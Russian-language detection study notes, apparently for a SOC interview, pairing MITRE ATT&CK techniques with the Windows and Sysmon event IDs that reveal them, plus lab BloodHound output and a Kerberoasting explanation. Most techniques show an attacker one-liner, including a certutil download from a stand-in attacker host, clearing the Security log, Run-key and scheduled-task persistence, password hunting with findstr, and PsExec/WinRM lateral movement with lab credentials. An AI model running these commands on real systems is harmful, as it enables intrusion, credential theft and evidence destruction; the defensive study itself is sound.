### Discovery (помимо BloodHound)

**T1018 — Remote System Discovery**

```
net view /domain
nltest /dclist:corp.local
```

Лог: **4661/4662** редко, чаще просто сетевой NetBIOS/LDAP трафик без явного Windows Event-сигнала — обнаруживается через network detection (Zeek/NetFlow), не через хостовые логи. Почему смотреть сюда: recon-фаза почти всегда предшествует lateral movement, и если её пропустить в логах — не будет контекста для следующего алерта.

**T1082 — System Information Discovery**

```
systeminfo
wmic qfe list
```

Лог: **Sysmon Event 1** (ProcessCreate) — `systeminfo.exe`/`wmic.exe` запущен интерактивным пользователем без соответствующей административной задачи. Само по себе низкой значимости, но в цепочке с другими discovery-командами — сигнал chain reconnaissance.

### Collection

**T1005 — Data from Local System**

```
findstr /si password *.txt *.xml *.ini
```

Лог: **Sysmon 11** (FileCreate) при копировании найденных файлов в staging-директорию, **4663** (Object Access) если аудит файлов включён на конфиденциальных шарах.

**T1039 — Data from Network Shared Drive**  
Лог: **5140** (Network share object accessed) с массовым доступом к разным файлам за короткое время с одной сессии — паттерн automated scraping, отличается от обычного пользовательского доступа частотой.

---

### Command and Control (C2)

**T1071.001 — Application Layer Protocol (Web)**  
Beacon через HTTP/HTTPS (Cobalt Strike, Sliver, Metasploit).  
Лог: **Sysmon 3** (NetworkConnect) — периодичность соединений (jitter beacon pattern) к одному внешнему IP/домену через равные интервалы. На network layer — Zeek `conn.log`, JA3/JA3S fingerprinting TLS handshake.

**T1105 — Ingress Tool Transfer**

```
certutil.exe -urlcache -split -f http://attacker/payload.exe payload.exe
```

Лог: **Sysmon 1** — `certutil.exe` с параметрами `-urlcache`/`-split` — классическая LOLBin-сигнатура, легитимно certutil так не используется практически никогда.

---

### Defense Evasion

**T1070.001 — Clear Windows Event Logs**

```
wevtutil cl Security
```

Лог: **Event 1102** (The audit log was cleared) — сам факт очистки лога это самое надёжное детектирование, потому что если лог очищен, само событие об очистке всё равно записывается в новый пустой лог.

**T1027 — Obfuscated/Encoded Files or Information**  
PowerShell с `-EncodedCommand`.  
Лог: **Sysmon 1** / PowerShell Operational log **4104** (ScriptBlockLogging) — Base64-декодированный блок виден именно в 4104, если Script Block Logging включён (по умолчанию не включён на многих хостах — важный gap, который стоит упомянуть на собеседовании).

### Persistence

**T1053.005 — Scheduled Task**

```
schtasks /create /sc onlogon /tn "Update" /tr "C:\payload.exe"
```

Лог: **Security 4698** (A scheduled task was created) — прямое попадание, всегда логируется при создании задачи через API.

**T1547.001 — Registry Run Keys**

```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d C:\payload.exe
```

Лог: **Sysmon 13** (RegistryEvent Value Set) на ветке Run/RunOnce — Windows Security log сам по себе это не покрывает без Sysmon.

### Lateral Movement (помимо PtH/PtT)

**T1021.002 — SMB/Windows Admin Shares (PsExec)**

```
impacket-psexec corp.local/alex:'123'@192.168.56.109
```

Лог: **Security 7045** (A service was installed) на целевой машине — PsExec создаёт временный service `PSEXESVC`, это самый надёжный индикатор именно этого инструмента, не путать с общим PtH.

**T1021.006 — WinRM**

```
evil-winrm -i 192.168.56.109 -u alex -p '123'
```

Лог: **4624 type 3** с `Logon Process: Negotiate` через порт 5985/5986, WinRM Operational log с деталями сессии.

---

### Exfiltration

**T1041 — Exfiltration Over C2 Channel**  
Лог: та же beacon-периодичность из C2-раздела, но с ростом объёма исходящего трафика (bytes-out) в конкретных временных окнах — смотри NetFlow/Zeek, не Windows Event Log.

**T1567.002 — Exfiltration to Cloud Storage**  
Загрузка через `rclone`/`curl` на внешний облачный сервис.  
Лог: **Sysmon 3** — соединение к известным доменам облачных хранилищ (`*.dropboxapi.com`, `*.googleapis.com`) с нетипичного для этого хоста процесса; на прокси/firewall — DNS-запросы к этим доменам с хостов, где такая активность не ожидается по business-контексту.

# BloodHound 

Инструмент разведки в AD, и дальнейшего анализа с помощью графов для поиска самого быстрого пути для повышения привилегий. использует несколько методов

- Использование самого LDAP протокола для доступа к сервису 4624 -> 4768 ->4769 ldap 
- Использование SMB доступа к  `\\*\IPC$` с целевыми namedpipes `samr` `srvsvc` `lsarpc` не от DC хоста, 4624 -> 4768 -> 4769 

Пример: 

```
┌──(user㉿kali)-[~/bloodhound]
└─$ bloodhound-python \               
-d corp.local \
-ns 192.168.56.115 \
-dc dc01.corp.local \
-u petr \
-p '123' \
-c All \
-v \
-op test
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
...
INFO: Done in 00M 01S
┌──(user㉿kali)-[~/bloodhound]
└─$ ls -la                   
total 520
drwxrwxr-x  2 user user   4096 Aug  9 12:53 .
drwx------ 47 user user   4096 Aug  9 12:45 ..
-rw-rw-r--  1 user user   9975 Aug  9 12:48 test_20260809124805_computers.json
....
-rw-rw-r--  1 user user  42402 Aug  9 12:53 test_20260809125350_users.json
```

далее используя постройку графов увидим кратчайщий путь до админа

# Kerberoasting

Атака которая заключается в получении TGS для для сервиса а после подбор пароля офлайн для учетной записи на которую зарегистрирован сервис, для реализации необходимо иметь аутентифицированную учетную запись, атака осуществима потому что Kerberos не проверяет имеет ли пользователь который запрашивает TGS  доступ к сервису, разрешать или запрещать доступ решает сам сервис, таким образом при слабых паролях мы можем легко подобрать хэш пароля для такой учетной записи, после получения хэша мы можем подобрать его офлайн
